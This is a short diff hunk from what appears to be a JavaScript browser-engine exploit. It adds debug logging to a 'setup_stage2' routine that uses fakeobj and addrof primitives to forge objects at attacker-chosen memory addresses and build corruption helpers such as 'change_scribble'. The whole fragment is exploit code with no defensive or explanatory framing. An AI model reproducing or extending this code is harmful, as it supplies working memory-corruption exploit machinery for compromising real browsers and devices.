@@ -18330,10 +18330,14 @@ const device_chipset = {
             throw new Error("scribble_element allocation failed");
           }
           print("setup_stage2: building change_scribble_holder");
+          print("setup_stage2: fake sentinel begin");
+          let fake_sentinel = p.fakeobj(0x108240700000000n);
+          print("setup_stage2: fake sentinel done");
           let change_scribble_holder = {
-            p1: p.fakeobj(0x108240700000000n),
+            p1: fake_sentinel,
             p2: scribble_element
           };
+          print("setup_stage2: change_scribble_holder built");
           print("setup_stage2: creating change_scribble");
           let change_scribble = p.fakeobj(p.addrof(change_scribble_holder) + 0x10n);
           print("setup_stage2: change_scribble created");
